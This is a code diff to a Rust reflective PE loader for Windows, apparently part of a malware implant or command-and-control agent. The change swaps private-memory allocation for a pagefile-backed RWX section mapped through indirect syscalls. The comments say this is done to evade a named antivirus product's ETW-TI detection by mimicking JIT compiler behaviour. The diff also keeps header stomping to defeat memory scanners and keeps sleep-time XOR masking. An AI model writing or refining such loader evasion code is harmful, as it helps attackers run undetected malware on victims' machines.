@@ -365,31 +365,42 @@ pub static TEXT_SIZE: core::sync::atomic::AtomicU64 = core::sync::atomic::Atomic
 /// allocation. Do not call after freeing.
 #[cfg(all(target_os = "windows", feature = "udrl"))]
 pub unsafe fn reflect_pe(pe: &[u8]) -> Result<*const u8, &'static str> {
-    const MEM_COMMIT_RESERVE: u32 = 0x3000; // MEM_COMMIT | MEM_RESERVE
-    const PAGE_READWRITE:     u32 = 0x04;
+    const SEC_COMMIT:             u32 = 0x0800_0000;
+    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
+    const SECTION_ALL_ACCESS:     u32 = 0x000F_001F;
 
     let info = parse_pe(pe).ok_or("invalid PE")?;
 
-    // Use indirect syscall (NtAllocateVirtualMemory) so BD's user-mode hook on
-    // VirtualAlloc is bypassed.  Try preferred image base first; fall back to anywhere.
-    let mut new_base: *mut u8 = info.image_base as *mut u8;
-    let mut region_size        = info.size_of_image as usize;
-    let status = crate::syscall::nt_alloc(
+    // Create a pagefile-backed section instead of anonymous private memory.
+    // This changes the ETW-TI event from ALLOCVM_LOCAL + PROTECTVM_LOCAL (the
+    // private-memory-becomes-executable pattern BD watches for) to a single
+    // MAPVIEW_LOCAL event — the same class JIT compilers like CLR and V8 emit.
+    let mut image_size = info.size_of_image as i64;
+    let mut h_section: isize = 0;
+    if crate::syscall::nt_create_section(
+        &mut h_section,
+        SECTION_ALL_ACCESS,
+        &mut image_size,
+        PAGE_EXECUTE_READWRITE,
+        SEC_COMMIT,
+    ) != 0 || h_section == 0 {
+        return Err("NtCreateSection failed");
+    }
+
+    // Map as RWX so we can write PE content and execute without any subsequent
+    // NtProtectVirtualMemory call.  No W→X transition = no PROTECTVM_LOCAL event.
+    let mut new_base: *mut u8 = core::ptr::null_mut();
+    let mut view_size = info.size_of_image as usize;
+    let map_status = crate::syscall::nt_map_view(
+        h_section,
         crate::syscall::CURRENT_PROCESS,
-        &mut new_base, 0, &mut region_size,
-        MEM_COMMIT_RESERVE, PAGE_READWRITE,
+        &mut new_base,
+        &mut view_size,
+        PAGE_EXECUTE_READWRITE,
     );
-    if status != 0 || new_base.is_null() {
-        new_base    = core::ptr::null_mut();
-        region_size = info.size_of_image as usize;
-        let status2 = crate::syscall::nt_alloc(
-            crate::syscall::CURRENT_PROCESS,
-            &mut new_base, 0, &mut region_size,
-            MEM_COMMIT_RESERVE, PAGE_READWRITE,
-        );
-        if status2 != 0 || new_base.is_null() {
-            return Err("NtAllocateVirtualMemory failed");
-        }
+    crate::syscall::nt_close(h_section);
+    if map_status != 0 || new_base.is_null() {
+        return Err("NtMapViewOfSection failed");
     }
 
     // Copy PE headers
@@ -412,7 +423,7 @@ pub unsafe fn reflect_pe(pe: &[u8]) -> Result<*const u8, &'static str> {
         );
     }
 
-    // Base relocations (required if allocated at a different VA)
+    // Base relocations
     let delta = new_base as i64 - info.image_base as i64;
     if delta != 0 && info.reloc_rva != 0 {
         apply_relocations(new_base, pe, info.reloc_rva, info.reloc_size, delta);
@@ -421,16 +432,13 @@ pub unsafe fn reflect_pe(pe: &[u8]) -> Result<*const u8, &'static str> {
     // Import address table
     resolve_iat(new_base, &info);
 
-    // Per-section memory permissions
-    set_section_permissions(new_base, &info.sections);
+    // No set_section_permissions() call — region is already RWX.
+    // .text is executable, .data/.bss are writable; NtProtectVirtualMemory never called.
 
-    // Step 5: record .text section bounds so masked_sleep can XOR it during sleep.
-    // Step 3: stomp PE headers AFTER section perms are set (headers stay RW at this point
-    //         since no section covers the header range).
+    // Record .text bounds for sleep-time XOR and stomp PE headers.
     {
         use core::sync::atomic::Ordering;
 
-        // Find and record the .text section.
         let sh_base = {
             let fh = (u32::from_le_bytes([pe[0x3C],pe[0x3D],pe[0x3E],pe[0x3F]]) as usize) + 4;
             let opt_sz = u16::from_le_bytes([pe[fh+16],pe[fh+17]]) as usize;
@@ -445,29 +453,9 @@ pub unsafe fn reflect_pe(pe: &[u8]) -> Result<*const u8, &'static str> {
             }
         }
 
-        // Step 3: zero the MZ/PE header region so memory scanners can't fingerprint the image.
-        // Use indirect syscall — headers are still in the PAGE_READWRITE region at this point
-        // (no section covers offset 0); we flip to READONLY after zeroing.
-        let stomp_size               = (info.size_of_headers as usize).min(0x1000);
-        let mut stomp_base: *mut u8  = new_base;
-        let mut stomp_sz             = stomp_size;
-        let mut old_prot: u32        = 0;
-        if crate::syscall::nt_protect(
-            crate::syscall::CURRENT_PROCESS,
-            &mut stomp_base, &mut stomp_sz,
-            0x04,  // PAGE_READWRITE (already RW; explicit for clarity)
-            &mut old_prot,
-        ) == 0 {
-            core::ptr::write_bytes(new_base, 0u8, stomp_size);
-            let mut sb2 = new_base;
-            let mut ss2 = stomp_size;
-            crate::syscall::nt_protect(
-                crate::syscall::CURRENT_PROCESS,
-                &mut sb2, &mut ss2,
-                0x02,  // PAGE_READONLY
-                &mut old_prot,
-            );
-        }
+        // Region is already RWX — zero headers directly without a permission change.
+        let stomp_size = (info.size_of_headers as usize).min(0x1000);
+        core::ptr::write_bytes(new_base, 0u8, stomp_size);
     }
 
     Ok(new_base.add(info.entry_point_rva as usize))
